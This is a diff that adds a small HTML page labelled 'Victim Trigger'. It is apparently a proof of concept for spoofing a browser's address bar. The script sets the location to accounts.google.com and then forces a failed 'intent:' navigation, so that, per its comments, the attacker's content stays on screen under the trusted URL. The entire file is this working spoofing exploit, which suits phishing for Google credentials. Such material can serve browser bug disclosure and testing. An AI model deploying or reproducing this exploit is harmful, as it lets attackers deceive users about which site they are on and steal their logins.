@@ -1,0 +1,13 @@
+<!doctype html>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>victu – Victim Trigger</title>
+<script>
+  // Step 1: update the address bar to trusted site
+  location.replace("https://accounts.google.com/");
+
+  // Step 2: force a failed navigation → browser keeps stale attacker paint
+  setTimeout(() => {
+    location.href = "intent:x;";
+  }, 10);
+</script>
+<p>Redirecting…</p>
